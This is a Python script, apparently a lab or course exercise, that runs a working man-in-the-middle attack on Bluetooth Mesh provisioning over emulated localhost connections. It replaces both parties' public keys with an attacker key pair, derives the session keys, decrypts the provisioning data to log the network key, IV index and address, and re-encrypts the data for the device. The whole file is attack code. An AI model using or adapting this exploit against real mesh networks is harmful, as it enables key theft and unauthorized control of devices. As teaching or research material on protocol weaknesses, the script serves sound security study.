#!/usr/bin/env python3
import logging
from pwn import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from toolbox import *
import select

# Create and configure logger
logger = logging.getLogger('attacker')
logger.setLevel(logging.DEBUG)  # Logger level

# Create console handler for INFO level
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(console_formatter)

# Add handlers to the logger
logger.addHandler(console_handler)

# Global variables to store intercepted data
device_uuid = None
device_public_key_x = None
device_public_key_y = None
device_confirmation = None
device_random_value = None
provisioner_public_key_x = None
provisioner_public_key_y = None
provisioner_confirmation = None
provisioner_random_value = None
confirmation_inputs = None
invite_pdu = None
capabilities_pdu = None
start_pdu = None
attacker_private_key = None
attacker_public_key_x = None
attacker_public_key_y = None

def fake_prov(s_prov, data):
    #TODO
    """
      Handle messages from device to provisioner
      Args:
          s_prov: connection to provisioner
          data: intercepted data from device
      """
    global device_uuid, device_public_key_x, device_public_key_y, device_confirmation
    global device_random_value, confirmation_inputs, capabilities_pdu

    logger.info(f'Intercepted device->provisioner: {data.hex()}')
    if data[0:1] == BEACON_TYPE:
        # Store device UUID for later use
        device_uuid = data[1:17]
        logger.info(f'device uuid: {device_uuid}')
        s_prov.send(data)
        return

    elif data[0:1] == LINK_ACK_OPCODE:
        s_prov.send(data)
        return

    elif data[0:1] == PROVISIONING_CAPABILITIES_OPCODE:
        # Store capabilities for confirmation_inputs
        capabilities_pdu = data[1:]
        s_prov.send(data)
        return

    elif data[0:1] == PROVISIONING_PUBLIC_KEY_OPCODE:
        # Store device's public key
        device_public_key_x = data[1:33]
        device_public_key_y = data[33:]

        # Generate our own key pair if not already done
        global attacker_private_key, attacker_public_key_x, attacker_public_key_y
        if not attacker_private_key:
            attacker_private_key, attacker_public_key_x, attacker_public_key_y = generate_key_pair()
            logger.info(f"Generated attacker keypair")

        # Forward our public key to provisioner instead of device's
        modified_data = PROVISIONING_PUBLIC_KEY_OPCODE + attacker_public_key_x + attacker_public_key_y
        logger.info(f"Sending attacker's public key to provisioner: {modified_data.hex()}")
        s_prov.send(modified_data)

        # Build confirmation_inputs
        if invite_pdu is not None and capabilities_pdu is not None and start_pdu is not None:
            global confirmation_inputs
            confirmation_inputs = (
                    invite_pdu +
                    capabilities_pdu +
                    start_pdu +
                    modified_data[1:] +  # Our public key
                    data[1:]  # Device's public key
            )
            logger.info(f"Built confirmation inputs: {confirmation_inputs.hex()}")
        else:
            logger.warning("Not all PDUs available for confirmation_inputs")
        return
    elif data[0:1] == PROVISIONING_CONFIRMATION_OPCODE:
        # Store device's confirmation value
        device_confirmation = data[1:]
        logger.info(f"Send device confirmation to provisioner: {device_confirmation.hex()}")
        s_prov.send(data)
        return

    elif data[0:1] == PROVISIONING_RANDOM_OPCODE:
        # Store device's random value
        device_random_value = data[1:]
        logger.info(f"Send device random value to provisioner: {device_random_value.hex()}")
        s_prov.send(data)
        return

    elif data[0:1] == PROVISIONING_COMPLETE_OPCODE:
        s_prov.send(data)
        return

    s_prov.send(data)


def fake_dev(s_dev, s_prov, data):
    #TODO
    """
        Handle messages from provisioner to device
        Args:
            s_dev: connection to device
            s_prov: connection to provisioner
            data: intercepted data from provisioner
        """
    global provisioner_public_key_x, provisioner_public_key_y, provisioner_confirmation
    global provisioner_random_value, invite_pdu, start_pdu, confirmation_inputs
    global attacker_private_key, attacker_public_key_x, attacker_public_key_y

    logger.info(f'Intercepted provisioner->device: {data.hex()}')
    if  len(data) == 1 and data[0:1] == LINK_OPEN_OPCODE:
        s_dev.send(data)
        return

    elif data[0:1] == PROVISIONING_INVITE_OPCODE:
        # Store invite PDU for confirmation_inputs
        invite_pdu = data[1:]
        s_dev.send(data)
        return

    elif data[0:1] == PROVISIONING_START_OPCODE:
        # Store start PDU for confirmation_inputs
        start_pdu = data[1:]
        s_dev.send(data)
        return

    elif len(data) > 1 and data[0:1]  == PROVISIONING_PUBLIC_KEY_OPCODE:
        # Store provisioner's public key
        provisioner_public_key_x = data[1:33]
        provisioner_public_key_y = data[33:]

        global attacker_private_key, attacker_public_key_x, attacker_public_key_y
        if not attacker_private_key:
            attacker_private_key, attacker_public_key_x, attacker_public_key_y = generate_key_pair()
            logger.info(f"Generated attacker keypair")

        # Send our public key to device instead of provisioner's
        modified_data = PROVISIONING_PUBLIC_KEY_OPCODE + attacker_public_key_x + attacker_public_key_y
        logger.info(f"Sending attacker's public key to device: {modified_data.hex()}")
        s_dev.send(modified_data)
        return

    elif data[0:1] == PROVISIONING_CONFIRMATION_OPCODE:
        # Store provisioner's confirmation value
        provisioner_confirmation = data[1:]
        logger.info(f"Send provisioner confirmation to device: {provisioner_confirmation.hex()}")
        s_dev.send(data)
        return

    elif data[0:1] == PROVISIONING_RANDOM_OPCODE:
        # Store provisioner's random value
        provisioner_random_value = data[1:]
        logger.info(f"Send provisioner random value to device: {provisioner_random_value.hex()}")
        s_dev.send(data)
        return

    elif data[0:1] == PROVISIONING_DATA_OPCODE:
        # Make sure we have all required data
        if None in [provisioner_public_key_x, device_public_key_x,
                    provisioner_random_value, device_random_value, confirmation_inputs]:
            logger.error("Missing required data for decryption")
            s_dev.send(data)
            return
            # Extract encrypted data and MIC
        encrypted_data = data[1:-8]  # Remove opcode and MIC
        mic = data[-8:]  # Last 8 bytes are MIC

        try:
            # Calculate the shared keys with both parties
            dhkey_prov = derive_dhkey(attacker_private_key, provisioner_public_key_x, provisioner_public_key_y)
            dhkey_dev = derive_dhkey(attacker_private_key, device_public_key_x, device_public_key_y)

            # Calculate salts
            confirmation_salt = s1(confirmation_inputs)
            prov_salt = s1(confirmation_salt + provisioner_random_value + device_random_value)

            # Calculate session key for decryption
            session_key = k1(dhkey_prov, prov_salt, b'prsk')
            nonce = k1(dhkey_prov, prov_salt, b'prsn')[:13]

            # Decrypt the provisioning data
            cipher = AES.new(session_key, AES.MODE_CCM, nonce=nonce, mac_len=8)
            cipher.update(b'')
            decrypted_data = cipher.decrypt_and_verify(encrypted_data, mic)

            # Extract and log the sensitive data
            network_key = decrypted_data[0:16]
            key_index = decrypted_data[16:18]
            flags = decrypted_data[18:19]
            iv_index = decrypted_data[19:23]
            unicast_address = decrypted_data[23:25]

            logger.info("=== Intercepted Sensitive Data ===")
            logger.info(f"Network Key: {network_key.hex()}")
            logger.info(f"Key Index: {key_index.hex()}")
            logger.info(f"Flags: {flags.hex()}")
            logger.info(f"IV Index: {iv_index.hex()}")
            logger.info(f"Unicast Address: {unicast_address.hex()}")

            # Re-encrypt the data for the device using our shared key
            session_key_dev = k1(dhkey_dev, prov_salt, b'prsk')
            nonce_dev = k1(dhkey_dev, prov_salt, b'prsn')[:13]

            cipher_dev = AES.new(session_key_dev, AES.MODE_CCM, nonce=nonce_dev, mac_len=8)
            cipher_dev.update(b'')
            encrypted_data_dev, mic_dev = cipher_dev.encrypt_and_digest(decrypted_data)

            modified_data = PROVISIONING_DATA_OPCODE + encrypted_data_dev + mic_dev
            s_dev.send(modified_data)
            return

        except Exception as e:
            logger.error(f"Error processing provisioning data: {e}")
            s_dev.send(data)
            return

    elif data[0:1] == LINK_CLOSE_OPCODE:
        s_dev.send(data)
        return

    s_dev.send(data)


def sniff():
    # Attacker acts as the middle man, she can sniff and modify all the data between the initiator and the responder
    # To emulate this, the attacker connects to the provisioner and the device to relay the data between them.
    prov_host = '127.0.0.1'
    prov_port = 65432
    prov_conn = remote(prov_host, prov_port)

    dev_host = '127.0.0.1'
    dev_port = 65433
    server = listen(dev_port, bindaddr=dev_host)
    dev_conn = server.wait_for_connection()

    sockets = [dev_conn, prov_conn]

    while True:
        readable, _, _ = select.select(sockets, [], [])
        for s in readable:
            if s == dev_conn:
                data = dev_conn.recv()
                fake_prov(prov_conn, data)
            elif s == prov_conn:
                data = prov_conn.recv()
                fake_dev(dev_conn, s, data)


if __name__ == "__main__":
    sniff()